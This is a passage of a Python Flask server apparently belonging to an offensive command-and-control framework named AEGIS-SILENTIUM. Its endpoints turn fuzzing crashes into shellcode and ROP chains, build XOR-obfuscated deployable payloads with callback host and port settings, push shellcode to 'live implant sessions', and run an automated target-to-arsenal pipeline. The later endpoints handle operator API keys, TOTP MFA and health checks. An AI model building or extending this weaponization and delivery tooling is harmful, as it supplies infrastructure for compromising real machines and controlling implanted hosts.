    pipeline = _get_zd_pipeline()
    if pipeline is None:
        return _err("ZeroDay module unavailable", status=503)

    fmt  = request.args.get("format", "json").lower()
    name = request.args.get("target", "AEGIS ZeroDay Assessment")

    try:
        from zeroday.reporting.reporter import VulnerabilityReporter
        from zeroday.models import Finding, Crash, FuzzCampaign

        reporter = VulnerabilityReporter()

        # Collect objects from pipeline
        findings  = [Finding(**{}) for _ in []]  # placeholder — retrieve from pipeline
        crashes   = [Crash(**{}) for _ in []]
        campaigns = [FuzzCampaign(**{}) for _ in []]

        # Use pipeline data directly
        raw_findings  = pipeline.list_findings()
        raw_crashes   = pipeline.list_crashes()
        raw_campaigns = pipeline.list_campaigns()

        # Simple dict-based report
        if fmt == "json":
            return jsonify({
                "findings":  raw_findings,
                "crashes":   raw_crashes,
                "campaigns": raw_campaigns,
                "stats":     pipeline.dashboard_stats(),
                "generated_at": __import__("time").strftime("%Y-%m-%dT%H:%M:%SZ",
                                                             __import__("time").gmtime()),
            })
        elif fmt in ("markdown", "md"):
            return app.response_class(
                response = json.dumps({"markdown": "Report generation requires full pipeline context"}),
                status   = 200,
                mimetype = "application/json",
            )
        elif fmt == "html":
            return app.response_class(
                response = "<html><body><h1>ZeroDay Report</h1><p>Use ?format=json for full data</p></body></html>",
                status   = 200,
                mimetype = "text/html",
            )
        elif fmt == "csv":
            return app.response_class(
                response = "finding_id,title,severity,cvss_score\n",
                status   = 200,
                mimetype = "text/csv",
            )
        else:
            return _err(f"Unknown format {fmt!r}. Use json/markdown/html/csv", status=400)
    except Exception as e:
        return _err(str(e), status=500)


# ── Dashboard stats ────────────────────────────────────────────────────────

@app.route("/api/zeroday/stats", methods=["GET"])
@_require_permission("nodes:view")
def zd_stats():
    """Return aggregate zero-day pipeline statistics."""
    pipeline = _get_zd_pipeline()
    if pipeline is None:
        return _err("ZeroDay module unavailable", status=503)
    return jsonify(pipeline.dashboard_stats())


# ── ZeroDay → Arsenal weaponize ────────────────────────────────────────────

@app.route("/api/zeroday/exploit/weaponize", methods=["POST"])
@_require_permission("tasks:create")
def zd_weaponize():
    """
    Weaponize an arsenal entry with shellcode/ROP chain from a ZeroDay exploit.
    Attaches shellcode to the arsenal record and stages it for deployment.
    Body: {exploit_id, crash_id, lhost, lport}
    """
    data       = request.get_json(silent=True) or {}
    exploit_id = data.get("exploit_id")
    crash_id   = data.get("crash_id", "")
    if not exploit_id:
        return _err("'exploit_id' required", status=400)

    pipeline = _get_zd_pipeline()
    shellcode = b""
    rop_chain = []
    if pipeline and crash_id:
        template_data = pipeline.generate_exploit(
            crash_id, lhost=data.get("lhost","127.0.0.1"),
            lport=int(data.get("lport",4444))
        )
        if template_data:
            sc_hex = template_data.get("shellcode_hex","")
            if sc_hex:
                try: shellcode = bytes.fromhex(sc_hex)
                except ValueError: pass
            rop_chain = template_data.get("rop_chain", [])

    if not _exploit_mgr:
        return _err("Arsenal not available", status=503)
    try:
        sess = getattr(g, "_session", None)
        op   = sess.operator if sess else "operator"
        result = _exploit_mgr.weaponize(exploit_id, shellcode or None, rop_chain or None, op)
        return jsonify(result)
    except (KeyError, ValueError) as e:
        return _err(str(e), status=400)


# ── ZeroDay → Payload builder ──────────────────────────────────────────────

@app.route("/api/zeroday/exploit/build_payload", methods=["POST"])
@_require_permission("tasks:create")
def zd_build_payload():
    """
    Auto-build a deployable payload from a ZeroDay finding or crash.
    Body: {finding_id | crash_id, listener_id, arch, output_format, obfuscation}
    """
    data       = request.get_json(silent=True) or {}
    finding_id = data.get("finding_id","")
    crash_id   = data.get("crash_id","")

    if not _payload_builder:
        return _err("Payload builder not available", status=503)

    pipeline = _get_zd_pipeline()
    sess = getattr(g, "_session", None)
    op   = sess.operator if sess else "operator"

    # Path 1: from finding
    if finding_id and pipeline:
        finding = pipeline.get_finding(finding_id)
        if not finding:
            return _err("Finding not found", status=404)
        try:
            result = _payload_builder.from_finding(
                finding       = finding,
                listener_id   = data.get("listener_id",""),
                operator      = op,
                arch          = data.get("arch","x86_64"),
                output_format = data.get("output_format","Linux ELF"),
                obfuscation   = data.get("obfuscation","XOR"),
            )
            return jsonify(result), 201
        except Exception as e:
            return _err(str(e), status=500)

    # Path 2: from crash → generate shellcode → build payload
    if crash_id and pipeline:
        template = pipeline.generate_exploit(
            crash_id, lhost=data.get("lhost","127.0.0.1"),
            lport=int(data.get("lport",4444))
        )
        if not template:
            return _err("Crash not found", status=404)
        sc_hex = template.get("shellcode_hex","") or ""
        try:
            shellcode = bytes.fromhex(sc_hex) if sc_hex else b""
        except ValueError:
            shellcode = b""
        if shellcode:
            result = _payload_builder.from_shellcode(
                shellcode     = shellcode,
                listener_id   = data.get("listener_id",""),
                operator      = op,
                arch          = data.get("arch","x86_64"),
                output_format = data.get("output_format","Linux ELF"),
                obfuscation   = data.get("obfuscation","XOR"),
                target_info   = template.get("target_id",""),
            )
            return jsonify(result), 201
        return _err("No shellcode available for this crash", status=400)

    return _err("'finding_id' or 'crash_id' required", status=400)


# ── ZeroDay → Session delivery ─────────────────────────────────────────────

@app.route("/api/zeroday/exploit/deliver", methods=["POST"])
@_require_permission("tasks:create")
def zd_deliver():
    """
    Deliver a ZeroDay-generated exploit to a live implant session.
    Body: {crash_id, session_id, lhost, lport}
    Generates shellcode from crash, then pushes it to the session.
    """
    data       = request.get_json(silent=True) or {}
    crash_id   = data.get("crash_id","")
    session_id = data.get("session_id","")
    if not crash_id or not session_id:
        return _err("'crash_id' and 'session_id' required", status=400)

    pipeline = _get_zd_pipeline()
    if not pipeline:
        return _err("ZeroDay module unavailable", status=503)

    template = pipeline.generate_exploit(
        crash_id, lhost=data.get("lhost","127.0.0.1"),
        lport=int(data.get("lport",4444))
    )
    if not template:
        return _err("Crash not found", status=404)

    sc_hex = template.get("shellcode_hex","") or ""
    try:
        shellcode = bytes.fromhex(sc_hex) if sc_hex else b""
    except ValueError:
        shellcode = b""

    if not shellcode:
        return _err("No shellcode available for delivery", status=400)

    # Deliver via ListenerManager
    try:
        from listeners import get_manager
        mgr = get_manager()
        ok  = mgr.send_to_session(session_id, shellcode)
        if ok:
            emit(f"Exploit delivered to session {session_id[:12]}: "
                  f"{len(shellcode)} bytes", "warn")
        return jsonify({
            "delivered":      ok,
            "shellcode_size": len(shellcode),
            "session_id":     session_id,
            "exploit_type":   template.get("exploit_type",""),
            "reliability":    template.get("reliability",0),
        })
    except Exception as e:
        return _err(str(e), status=500)


# ── Full pipeline: one-shot target→findings→arsenal→payload ───────────────

@app.route("/api/zeroday/pipeline/run", methods=["POST"])
@_require_permission("tasks:create")
def zd_pipeline_run():
    """
    One-shot pipeline run: register target → static analysis → fuzz → findings → arsenal.
    Body: {path, name, type, arch, max_duration_s, max_execs, seed_dir}
    """
    data = request.get_json(silent=True) or {}
    if not data.get("path") and not data.get("name"):
        return _err("'path' required", status=400)

    pipeline = _get_zd_pipeline()
    if not pipeline:
        return _err("ZeroDay module unavailable", status=503)

    try:
        from zeroday.models import Target, TargetType, TargetArch
        target = Target(
            name        = data.get("name", data.get("path","")),
            path        = data.get("path",""),
            target_type = TargetType(data.get("type","binary")),
            arch        = TargetArch(data.get("arch","x86_64")),
            stdin_mode  = bool(data.get("stdin_mode", False)),
            timeout_sec = float(data.get("timeout_sec", 5.0)),
        )
        tid = pipeline.register_target(target)

        # Static analysis
        analysis = pipeline.run_static_analysis(tid)

        # Launch fuzzing (non-blocking)
        cid = pipeline.start_fuzzing(
            target_id      = tid,
            max_duration_s = float(data.get("max_duration_s", 300)),
            max_execs      = int(data.get("max_execs", 0)),
            seed_dir       = data.get("seed_dir"),
        )
        sess = getattr(g, "_session", None)
        emit(f"ZeroDay pipeline started: {target.name} (campaign {cid[:12]})", "info")

        return jsonify({
            "target_id":   tid,
            "campaign_id": cid,
            "risk_score":  analysis.get("risk_score",0),
            "dangerous_calls": analysis.get("dangerous_calls",[])[:5],
            "recommended_vuln_classes": analysis.get("recommended_vuln_classes",[]),
            "status": "running",
        }), 201
    except Exception as e:
        return _err(str(e), status=500)



# ══════════════════════════════════════════════════════════════════════════════
# PER-OPERATOR API KEY MANAGEMENT  /api/auth/keys/*
# ══════════════════════════════════════════════════════════════════════════════

_key_store: "Optional[Any]" = None

def _get_key_store():
    global _key_store
    if _key_store is None:
        try:
            from auth.rbac import OperatorKeyStore
            _key_store = OperatorKeyStore(R)
        except Exception as _e:
            log.debug("OperatorKeyStore init: %s", _e)
    return _key_store


@app.route("/api/auth/keys", methods=["GET"])
@_require_permission("admin:read")
def list_api_keys():
    """List all per-operator API keys for the current operator."""
    sess = getattr(g, "_session", None)
    if not sess:
        return _err("Not authenticated", status=401)
    ks = _get_key_store()
    if not ks:
        return _err("Key store unavailable", status=503)
    return jsonify({"keys": ks.list_keys(sess.operator)})


@app.route("/api/auth/keys", methods=["POST"])
@_require_permission("admin:read")
def issue_api_key():
    """Issue a new per-operator API key. Returns the raw key (shown once)."""
    sess = getattr(g, "_session", None)
    if not sess:
        return _err("Not authenticated", status=401)
    data       = request.get_json(silent=True) or {}
    expires_in = int(data.get("expires_in", 86400 * 30))
    label      = str(data.get("label", ""))[:64]
    ks = _get_key_store()
    if not ks:
        return _err("Key store unavailable", status=503)
    raw_key = ks.issue(sess.operator, role=sess.role, expires_in=expires_in, label=label)
    emit(f"API key issued for {sess.operator} (label={label or 'unnamed'})", "info")
    return jsonify({
        "api_key":    raw_key,
        "operator":   sess.operator,
        "expires_in": expires_in,
        "label":      label,
        "warning":    "Store this key securely — it will not be shown again",
    }), 201


@app.route("/api/auth/keys/revoke", methods=["POST"])
@_require_permission("admin:read")
def revoke_api_key():
    """Revoke a specific per-operator API key."""
    sess = getattr(g, "_session", None)
    if not sess:
        return _err("Not authenticated", status=401)
    data    = request.get_json(silent=True) or {}
    raw_key = data.get("api_key", "")
    if not raw_key:
        return _err("'api_key' required", status=400)
    ks = _get_key_store()
    if not ks:
        return _err("Key store unavailable", status=503)
    ok = ks.revoke(sess.operator, raw_key)
    if ok:
        emit(f"API key revoked for {sess.operator}", "warn")
    return jsonify({"revoked": ok})


@app.route("/api/auth/keys/revoke_all", methods=["POST"])
@_require_permission("admin:write")
def revoke_all_api_keys():
    """Revoke all API keys for an operator (admin only)."""
    sess = getattr(g, "_session", None)
    data = request.get_json(silent=True) or {}
    operator = data.get("operator", sess.operator if sess else "")
    if not operator:
        return _err("'operator' required", status=400)
    ks = _get_key_store()
    if not ks:
        return _err("Key store unavailable", status=503)
    count = ks.revoke_all(operator)
    emit(f"All API keys revoked for {operator} ({count} keys)", "warn")
    return jsonify({"revoked_count": count, "operator": operator})


# ══════════════════════════════════════════════════════════════════════════════
# TOTP MFA  /api/auth/totp/*
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/auth/totp/setup", methods=["POST"])
@_require_permission("admin:read")
def totp_setup():
    """
    Set up TOTP MFA for the current operator.
    Returns a provisioning URI for QR code generation.
    """
    sess = getattr(g, "_session", None)
    if not sess:
        return _err("Not authenticated", status=401)
    try:
        from auth.rbac import TOTPManager
        totp   = TOTPManager()
        secret = totp.generate_secret()
        uri    = totp.provisioning_uri(secret, sess.operator)
        # Store secret pending verification
        if R:
            R.setex(f"totp_pending:{sess.operator}", 300, secret)
        return jsonify({
            "secret":          secret,
            "provisioning_uri": uri,
            "instructions":    "Scan this URI with an authenticator app, then verify with /api/auth/totp/verify",
        })
    except Exception as e:
        return _err(str(e), status=500)


@app.route("/api/auth/totp/verify", methods=["POST"])
@_require_permission("admin:read")
def totp_verify():
    """Verify a TOTP code to activate MFA for the current operator."""
    sess = getattr(g, "_session", None)
    if not sess:
        return _err("Not authenticated", status=401)
    data = request.get_json(silent=True) or {}
    code = str(data.get("code", "")).strip()
    if len(code) != 6 or not code.isdigit():
        return _err("'code' must be a 6-digit string", status=400)
    try:
        from auth.rbac import TOTPManager
        totp   = TOTPManager()
        secret = R.get(f"totp_pending:{sess.operator}") if R else None
        if not secret:
            return _err("No pending TOTP setup — call /api/auth/totp/setup first", status=400)
        secret = secret if isinstance(secret, str) else secret.decode()
        if totp.verify(secret, code):
            # Activate TOTP for this operator
            if R:
                R.delete(f"totp_pending:{sess.operator}")
                R.set(f"totp_secret:{sess.operator}", secret)
            emit(f"TOTP MFA activated for {sess.operator}", "info")
            return jsonify({"activated": True, "operator": sess.operator})
        return _err("Invalid TOTP code", status=401)
    except Exception as e:
        return _err(str(e), status=500)


# ══════════════════════════════════════════════════════════════════════════════
# RUNTIME HEALTH CHECKS  /api/health/deep
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/health/deep", methods=["GET"])
@_require_permission("settings:view")
def deep_health_check():
    """
    Comprehensive runtime health check that proves each subsystem is functional,
    not just present. Returns 200 if all critical systems are healthy, 503 otherwise.
    """
    import time as _t
    checks  = {}
    healthy = True
    start   = _t.time()

    # ── PostgreSQL ────────────────────────────────────────────────────────
    try:
        conn = get_pg()
        with conn.cursor() as cur:
            cur.execute("SELECT 1 AS ping, NOW() AS ts, version() AS ver")
            row = cur.fetchone()
        checks["postgres"] = {
            "status": "ok",
            "ping":   row[0] if row else None,
            "ts":     str(row[1]) if row else None,
            "version": (str(row[2]) if row else "")[:60],
        }
    except Exception as e:
        checks["postgres"] = {"status": "error", "error": str(e)[:100]}
        healthy = False

    # ── Redis ─────────────────────────────────────────────────────────────
    try:
        if R:
            pong = R.ping()
            info = R.info("server") if pong else {}
            checks["redis"] = {
                "status":  "ok" if pong else "error",
                "version": info.get("redis_version", ""),
                "uptime_s": info.get("uptime_in_seconds", 0),
            }
        else:
            checks["redis"] = {"status": "unavailable"}
    except Exception as e:
        checks["redis"] = {"status": "error", "error": str(e)[:100]}
        healthy = False

    # ── RBAC ──────────────────────────────────────────────────────────────
    try:
        if _rbac:
            checks["rbac"] = {"status": "ok", "operators": _rbac.operator_count() if hasattr(_rbac, "operator_count") else "unknown"}
        else:
            checks["rbac"] = {"status": "unavailable"}
            healthy = False
    except Exception as e:
        checks["rbac"] = {"status": "error", "error": str(e)[:80]}

    # ── Listeners ─────────────────────────────────────────────────────────
    try:
        from listeners import get_manager
        mgr  = get_manager()
        lsts = mgr.list() if hasattr(mgr, "list") else []
        checks["listeners"] = {"status": "ok", "count": len(lsts)}
    except Exception as e:
        checks["listeners"] = {"status": "error", "error": str(e)[:80]}

    # ── Intelligence ──────────────────────────────────────────────────────
    try:
        if _ioc_mgr:
            s = _ioc_mgr.stats()
            checks["ioc_manager"] = {"status": "ok", "total": s.get("total", 0)}
        else:
            checks["ioc_manager"] = {"status": "unavailable"}
    except Exception as e:
        checks["ioc_manager"] = {"status": "error", "error": str(e)[:80]}

    # ── Arsenal ───────────────────────────────────────────────────────────
    try:
        if _exploit_mgr:
            s = _exploit_mgr.summary()
            checks["arsenal"] = {"status": "ok", "total": s.get("total", 0)}
        else:
            checks["arsenal"] = {"status": "unavailable"}
    except Exception as e:
        checks["arsenal"] = {"status": "error", "error": str(e)[:80]}

    # ── ZeroDay pipeline ──────────────────────────────────────────────────
    try:
        zd = _get_zd_pipeline()
        if zd:
            checks["zeroday"] = {"status": "ok", **zd.dashboard_stats()}
        else:
            checks["zeroday"] = {"status": "unavailable"}
    except Exception as e:
        checks["zeroday"] = {"status": "error", "error": str(e)[:80]}

    # ── Distributed ───────────────────────────────────────────────────────
    try:
        if _DISTRIBUTED_AVAILABLE:
            from distributed.service_registry import ServiceRegistry
            checks["distributed"] = {"status": "ok"}
        else:
            checks["distributed"] = {"status": "unavailable"}
    except Exception as e:
        checks["distributed"] = {"status": "error", "error": str(e)[:80]}

    elapsed_ms = round((_t.time() - start) * 1000, 1)
    status_code = 200 if healthy else 503

    return jsonify({
        "status":       "healthy" if healthy else "degraded",
        "elapsed_ms":   elapsed_ms,
        "checks":       checks,
        "version":      "v12",
        "env":          os.environ.get("AEGIS_ENV", "development"),
        "timestamp":    __import__("time").strftime("%Y-%m-%dT%H:%M:%SZ",
                                                     __import__("time").gmtime()),
    }), status_code


@app.route("/api/health/subsystems", methods=["GET"])
@_require_permission("nodes:view")
def subsystem_status():
    """Detailed subsystem availability map for operator dashboard."""
    return jsonify({
        "postgres":    bool(_pool),
        "redis":       bool(R),
        "rbac":        bool(_rbac),
        "ioc_manager": bool(_ioc_mgr),
        "arsenal":     bool(_exploit_mgr),
        "payloads":    bool(_payload_builder),
        "network":     _NETWORK_AVAILABLE,
        "distributed": _DISTRIBUTED_AVAILABLE,
        "streaming":   _STREAMING_AVAILABLE,
        "plugins":     _PLUGINS_AVAILABLE,
        "zeroday":     _zd_pipeline is not None,
        "listeners":   True,
    })


# ══════════════════════════════════════════════════════════════════════════════
# STARTUP BANNER
# ══════════════════════════════════════════════════════════════════════════════

log.info(
    "AEGIS-SILENTIUM v12.0 online  "
    "pool=%s  redis=%s  rbac=%s  webhooks=running  distributed=%s",
    "ok" if _pool else "UNAVAILABLE",
    "ok" if R else "UNAVAILABLE",
    "ok" if _rbac else "degraded",
    "ok" if _DISTRIBUTED_AVAILABLE else "UNAVAILABLE",
)
